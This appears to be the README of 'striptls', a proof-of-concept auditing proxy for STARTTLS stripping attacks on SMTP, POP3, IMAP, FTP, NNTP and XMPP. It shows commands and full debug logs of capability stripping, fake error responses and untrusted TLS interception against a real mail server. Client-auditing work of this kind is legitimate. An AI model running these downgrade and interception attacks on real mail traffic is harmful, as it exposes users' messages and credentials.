# striptls - auditing proxy

poc implementation of STARTTLS stripping attacks

* SMTP
 * SMTP.StripFromCapabilities - server response capability patch
 * SMTP.StripWithInvalidResponseCode - client STARTTLS stripping, invalid response code
 * SMTP.UntrustedIntercept - STARTTLS interception (client and server talking ssl) (requires server.pem in pwd)
 * SMTP.StripWithTemporaryError
 * SMTP.StripWithError
* POP3 (untested)
 * POP3.StripFromCapabilities
 * POP3.StripWithError
 * POP3.UntrustedIntercept
* IMAP (untested)
 * IMAP.StripFromCapabilities
 * IMAP.StripWithError
 * IMAP.UntrustedIntercept
* FTP (untested)
 * FTP.StripFromCapabilities
 * FTP.StripWithError
 * FTP.UntrustedIntercept
* NNTP (untested)
 * NNTP.StripFromCapabilities  
 * NNTP.StripWithError
 * NNTP.UntrustedIntercept
* XMPP (untested)
 * XMPP.StripFromCapabilities
 
 
## Examples

local smtp-client -> localhost:8825 (proxy) -> mail.gmx.net:25

### Audit Mode

iterates all protocol specific cases on a per client basis and keeps track of clients violating the starttls protocol. Ctrl+C to abort audit and print results.

	#> striptls/striptls.py --listen localhost:8825 --remote=mail.gmx.net:25
	2016-01-31 22:48:03,805 - INFO     - <Proxy 0x20a8fb0 listen=('0.0.0.0', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.StripFromCapabilities at 0x020B1148>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.StripWithError at 0x020B1180>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:21   , proto:     FTP): <class __main__.UntrustedIntercept at 0x020B11B8>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.StripFromCapabilities at 0x020B1068>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.StripWithError at 0x020B10A0>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:143  , proto:    IMAP): <class __main__.UntrustedIntercept at 0x020B10D8>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.StripFromCapabilities at 0x020B1228>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.StripWithError at 0x020B1260>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:119  , proto:    NNTP): <class __main__.UntrustedIntercept at 0x020B1298>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:110  , proto:    POP3): <class __main__.StripWithError at 0x02099F80>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:110  , proto:    POP3): <class __main__.UntrustedIntercept at 0x02099FB8>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripFromCapabilities at 0x02099E30>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithError at 0x02099ED8>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithInvalidResponseCode at 0x02099E68>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.StripWithTemporaryError at 0x02099EA0>
	2016-01-31 22:48:03,805 - DEBUG    - * added test (port:25   , proto:    SMTP): <class __main__.UntrustedIntercept at 0x02099F10>
	2016-01-31 22:48:03,806 - DEBUG    - * added test (port:5222 , proto:    XMPP): <class __main__.StripFromCapabilities at 0x020B1308>
	2016-01-31 22:48:03,806 - INFO     - <RewriteDispatcher rules={5222: set([<class __main__.StripFromCapabilities at 0x020B1308>]), 110: set([<class __main__.StripWithError at 0x02099F80>, <class __main__.UntrustedIntercept at 0x02099FB8>]), 143: set([<class __main__.StripWithError at 0x020B10A0>, <class __main__.UntrustedIntercept at 0x020B10D8>, <class __main__.StripFromCapabilities at 0x020B1068>]), 21: set([<class __main__.StripWithError at 0x020B1180>, <class __main__.UntrustedIntercept at 0x020B11B8>, <class __main__.StripFromCapabilities at 0x020B1148>]), 119: set([<class __main__.UntrustedIntercept at 0x020B1298>, <class __main__.StripFromCapabilities at 0x020B1228>, <class __main__.StripWithError at 0x020B1260>]), 25: set([<class __main__.UntrustedIntercept at 0x02099F10>, <class __main__.StripWithTemporaryError at 0x02099EA0>, <class __main__.StripFromCapabilities at 0x02099E30>, <class __main__.StripWithError at 0x02099ED8>, <class __main__.StripWithInvalidResponseCode at 0x02099E68>])}>
	2016-01-31 22:48:07,921 - DEBUG    - <ProtocolDetect 0x20cbc50 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 22:48:07,923 - INFO     - <Session 0x20be1f0> client ('127.0.0.1', 22898) has connected
	2016-01-31 22:48:07,923 - INFO     - <Session 0x20be1f0> connecting to target ('mail.gmx.net', 25)
	2016-01-31 22:48:08,158 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
	2016-01-31 22:48:08,158 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.UntrustedIntercept new: True>
	2016-01-31 22:48:09,112 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 22:48:09,194 - DEBUG    - <Session 0x20be1f0> [client] <= [server][mangled] '220 Go ahead\r\n'
	2016-01-31 22:48:09,444 - DEBUG    - <Session 0x20be1f0> [client] <= [server][mangled] waiting for inbound SSL Handshake
	2016-01-31 22:48:09,444 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 22:48:09,538 - DEBUG    - <Session 0x20be1f0> [client] => [server][mangled] performing outbound SSL handshake
	2016-01-31 22:48:09,948 - DEBUG    - <Session 0x20be1f0> [client] => [server][mangled] None
	2016-01-31 22:48:09,948 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 22:48:10,029 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 22:48:10,029 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 22:48:10,108 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 22:48:10,108 - DEBUG    - <Session 0x20be1f0> [client] => [server]          'rset\r\n'
	2016-01-31 22:48:10,217 - DEBUG    - <Session 0x20be1f0> [client] <= [server]          '250 OK\r\n'
	2016-01-31 22:48:10,230 - WARNING  - <Session 0x20be1f0> terminated.
	2016-01-31 22:48:12,375 - DEBUG    - <ProtocolDetect 0x20cbd70 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 22:48:12,377 - INFO     - <Session 0x20cbcf0> client ('127.0.0.1', 22901) has connected
	2016-01-31 22:48:12,377 - INFO     - <Session 0x20cbcf0> connecting to target ('mail.gmx.net', 25)
	2016-01-31 22:48:12,517 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
	2016-01-31 22:48:12,517 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithTemporaryError new: True>
	2016-01-31 22:48:13,503 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 22:48:13,585 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] <= [server][mangled] '454 TLS not available due to temporary reason\r\n'
	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server][mangled] None
	2016-01-31 22:48:13,601 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 22:48:13,696 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 22:48:13,711 - DEBUG    - <Session 0x20cbcf0> [client] => [server]          'rset\r\n'
	2016-01-31 22:48:13,789 - DEBUG    - <Session 0x20cbcf0> [client] <= [server]          '250 OK\r\n'
	2016-01-31 22:48:13,805 - WARNING  - <Session 0x20cbcf0> terminated.
	2016-01-31 22:48:15,648 - DEBUG    - <ProtocolDetect 0x20cbe30 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 22:48:15,650 - INFO     - <Session 0x20cbd30> client ('127.0.0.1', 22904) has connected
	2016-01-31 22:48:15,650 - INFO     - <Session 0x20cbd30> connecting to target ('mail.gmx.net', 25)
	2016-01-31 22:48:15,808 - DEBUG    - <Session 0x20cbd30> [client] <= [server]          '220 gmx.com (mrgmx001) Nemesis ESMTP Service ready\r\n'
	2016-01-31 22:48:15,808 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripFromCapabilities new: True>
	2016-01-31 22:48:16,778 - DEBUG    - <Session 0x20cbd30> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 22:48:16,907 - DEBUG    - <Session 0x20cbd30> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 22:48:16,907 - DEBUG    - <Session 0x20cbd30> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 22:48:16,921 - WARNING  - <Session 0x20cbd30> terminated.
	2016-01-31 22:48:59,542 - WARNING  - <Session 0x20b97f0> terminated.
	...
	2016-01-31 22:49:03,305 - WARNING  - Ctrl C - Stopping server
	2016-01-31 22:49:03,305 - INFO     -  -- audit results --
	2016-01-31 22:49:03,305 - INFO     - [*] client: 127.0.0.1
	2016-01-31 22:49:03,305 - INFO     -     [           ] <class __main__.StripFromCapabilities at 0x01ECF180>
	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.StripWithError at 0x01ECF688>
	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.UntrustedIntercept at 0x01ECF6F8>
	2016-01-31 22:49:03,305 - INFO     -     [Vulnerable!] <class __main__.StripWithInvalidResponseCode at 0x01ECF5E0>

### Strip STARTTLS from server capabilities

	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripFromCapabilities
	2016-01-31 15:44:35,000 - INFO     - <Proxy 0x1fe6e70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:44:35,000 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripFromCapabilities at 0x01FE77D8>])}>
	2016-01-31 15:44:37,030 - DEBUG    - <ProtocolDetect 0x1fe6f90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> client ('127.0.0.1', 20070) has connected
	2016-01-31 15:44:37,032 - INFO     - <Session 0x1fe6f10> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:44:39,051 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:44:40,335 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 15:44:40,746 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:44:41,292 - DEBUG    - <Session 0x1fe6f10> [client] => [server]          'rset\r\n'
	2016-01-31 15:44:41,605 - DEBUG    - <Session 0x1fe6f10> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:44:41,612 - WARNING  - <Session 0x1fe6f10> terminated.

### Invalid STARTTLS response code

	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.StripWithInvalidResponseCode
	2016-01-31 15:42:40,325 - INFO     - <Proxy 0x1fefe70 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:42:40,325 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.StripWithInvalidResponseCode at 0x02010730>])}>
	2016-01-31 15:43:19,755 - DEBUG    - <ProtocolDetect 0x1feff90 is_protocol=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> client ('127.0.0.1', 20061) has connected
	2016-01-31 15:43:19,756 - INFO     - <Session 0x1feff10> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:43:21,473 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '220 gmx.com (mrgmx003) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:43:22,395 - DEBUG    - <Session 0x1feff10> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:43:23,019 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250-STARTTLS\r\n250 STARTTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] <= [server][mangled] '200 STRIPTLS\r\n'
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server][mangled] None
	2016-01-31 15:43:23,035 - DEBUG    - <Session 0x1feff10> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:43:23,160 - DEBUG    - <Session 0x1feff10> [client] => [server]          'rset\r\n'
	2016-01-31 15:43:23,269 - DEBUG    - <Session 0x1feff10> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:43:23,285 - WARNING  - <Session 0x1feff10> terminated.


### Untrusted SSL Intercept (for clients not checking server cert trust)

	#> striptls/striptls.py --listen=localhost:8825 --remote=mail.gmx.net:25 --test=SMTP.UntrustedIntercept
	2016-01-31 15:59:02,417 - INFO     - <Proxy 0x1f468f0 listen=('localhost', 8825) target=('mail.gmx.net', 25)> ready.
	2016-01-31 15:59:02,417 - INFO     - <RewriteDispatcher attacks={25: set([<class __main__.UntrustedIntercept at 0x01F45298>])}>
	2016-01-31 15:59:06,292 - DEBUG    - <ProtocolDetect 0x1f46a10 protocol_id=PROTO_SMTP len_history=0> - protocol detected (target port)
	2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> client ('127.0.0.1', 20238) has connected
	2016-01-31 15:59:06,293 - INFO     - <Session 0x1f46990> connecting to target ('mail.gmx.net', 25)
	2016-01-31 15:59:06,561 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '220 gmx.com (mrgmx002) Nemesis ESMTP Service ready\r\n'
	2016-01-31 15:59:07,500 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:59:07,565 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 31457280\r\n250-AUTH LOGIN PLAIN\r\n250 STARTTLS\r\n'
	2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:59:07,581 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] '220 Go ahead\r\n'
	2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] <= [server][mangled] waiting for inbound SSL Handshake
	2016-01-31 15:59:07,832 - DEBUG    - <Session 0x1f46990> [client] => [server]          'STARTTLS\r\n'
	2016-01-31 15:59:07,926 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] performing outbound SSL handshake
	2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server][mangled] None
	2016-01-31 15:59:08,219 - DEBUG    - <Session 0x1f46990> [client] => [server]          'ehlo [192.168.139.1]\r\n'
	2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250-gmx.com Hello [192.168.139.1] [109.126.64.18]\r\n250-SIZE 69920427\r\n250 AUTH LOGIN PLAIN\r\n'
	2016-01-31 15:59:08,312 - DEBUG    - <Session 0x1f46990> [client] => [server]          'mail FROM:<a@b.com> size=10\r\n'
	2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '530 Authentication required\r\n'
	2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] => [server]          'rset\r\n'
	2016-01-31 15:59:08,469 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250 OK\r\n'
	2016-01-31 15:59:08,484 - WARNING  - <Session 0x1f46990> terminated.
